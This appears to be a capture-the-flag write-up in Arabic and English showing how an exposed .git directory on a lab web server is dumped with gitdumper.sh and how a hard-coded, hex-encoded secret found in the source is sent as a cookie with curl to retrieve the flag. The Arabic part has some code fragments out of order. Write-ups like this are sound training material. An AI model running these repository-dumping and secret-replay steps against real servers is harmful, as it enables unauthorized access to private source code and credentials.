# 🕵️‍♂️ Web Challenge - Git Exposure to Flag

## 📜 وصف التحدي
في هذا التحدي، تم اكتشاف أن مجلد `.git/` مكشوف على السيرفر، مما أتاح لنا استرجاع ملفات حساسة تم حذفها لاحقًا. من خلال تحليل ملفات المشروع واستغلال الكوكيز، تمكّنا من الوصول إلى الفلاغ.

---

## 🧩 خطوات الحل

### 1. 🕳️ اكتشاف `.git` مفتوح
لاحظنا أن المجلد `.git/` يمكن الوصول إليه عبر المتصفح:

http://target.com/.git/


### 2. 🛠️ تحميل ملفات Git
استخدمنا أداة [gitdumper.sh](https://github.com/internetwache/GitTools) لتحميل المشروع:

```bash
gitdumper.sh http://target.com/.git/ ./recovered_repo
cd recovered_repo
git checkout .

if ($_COOKIE['api_key'] == $apikey)
    echo "Flag: $flag";
```
```
cat contact_process.php
```
$access = bin2hex('this_is_top_secret');

```
php -r "echo bin2hex('this_is_top_secret');"
```
يظهر ناتج التالي
```
746869735f69735f746f705f736563726574
```
بعد ذلك نستخدام الامر تالي للحصول على العلم
```
curl -b "api_key=746869735f69735f746f705f736563726574" http://target.com/api.php
```


# 🕵️‍♂️ Web Challenge - Git Exposure to Flag

## 📜 Challenge Description

In this challenge, we discovered that the `.git/` directory was publicly accessible on the server. This allowed us to recover sensitive project files that had been deleted. By analyzing the source code and leveraging cookie-based authentication, we were able to retrieve the flag.

---

## 🧩 Solution Steps

### 1. 🕳️ Public `.git` Directory Discovery

We noticed that the `.git/` folder was accessible via browser:



---

### 2. 🛠️ Dumping Git Files

We used the [gitdumper.sh](https://github.com/internetwache/GitTools) tool to recover the project source:

```bash
gitdumper.sh http://target.com/.git/ ./recovered_repo
cd recovered_repo
git checkout .
```

### 3. 🔍 Reviewing api.php
We found the following code:

```
if ($_COOKIE['api_key'] == $apikey)
    echo "Flag: $flag";
```
So, if we send the correct api_key value via a cookie, the flag will be revealed.

### 4. 📁 Analyzing access.php and contact_process.php
From the Git history, we found that $apikey is set from another variable:
`$apikey = $access;
`

In contact_process.php, we discovered this assignment:
`$access = bin2hex('this_is_top_secret');`
We can decode it using PHP:
`php -r "echo bin2hex('this_is_top_secret');"
`
This returns:

746869735f69735f746f705f736563726574

curl -b "api_key=746869735f69735f746f705f736563726574" http://target.com/api.php


🏁 Result
✅ Successfully bypassed the check and retrieved the flag.
